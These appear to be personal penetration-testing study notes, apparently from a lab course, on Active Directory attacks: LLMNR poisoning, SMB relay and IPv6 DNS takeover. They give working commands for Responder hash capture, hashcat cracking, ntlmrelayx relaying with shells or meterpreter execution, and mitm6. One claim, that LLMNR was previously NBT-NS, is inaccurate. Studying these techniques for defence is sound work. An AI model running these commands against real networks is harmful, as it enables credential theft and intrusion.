# LLMNR Poisoning
 - Link Local Multicast Name Resolution.
 - Previously known as  NBT-NS.
 - Used to identify hosts when DNS fails.
 - Flaw here is, service responds with username and NTLM-v2 Hash when approiately responded to.
 - Attack process
    1. Victim tries to connec to `\\some_machine`, so it queries DNS server.
    2. If the server does not have, the victim does a broadcast.
    3. The attacker then replies to victim, yes i have `\\some_machine`, send me your hash, and I will connect you to it.
    4. Victim then sends its NTLM hash.
 - Needs lot of traffic, so run first thing. 
 - `sudo ./test/bin/python Responder.py -I vboxnet0 -rdwv`
 - `hashcat -m 5600 hash.txt rockyou.txt`

# SMB relay
 - Instead of cracking hash, just pass in the hash directly.
 - To find devices with smbsigning disabled `nmap --script=smb2-security-mode.nse -p445 <network>/24`.
 - Usually servers have smb signing enabled and required, but hosts will have smb signing enabled but not required.
 - Needs SMB signing to be disabled (SMB signing disabled means machine does not check where the hash came from), relayed creds must have admin priv on machine.
 - Turn off SMB and HTTP, we don't want to respond, listen on rsponder for hashes.
 - use ntlmrelayx `python ntlmrelayx -tf targets.txt -smb2support`. targets.txt will have IPs of victims.
 - For newer kali `impacket-ntlmrelayx -tf targets.txt -smb2support`
 - `-i` to get interactive smb shell, `-e meterpreter.exe`

## IPv6 attack
 - A system has IPv6 configured, DNS for it is usually not configured, an attacker claims itself to be DNS server for IPv6, and when victim queries it, it will get creds as well.
 - `mitm6 -d MARVEL.local` to listen
 - `ntlmrelayx.py -6 -t ldaps://<AD_IP> -wh fakewpad.ldap.local -l lootme`
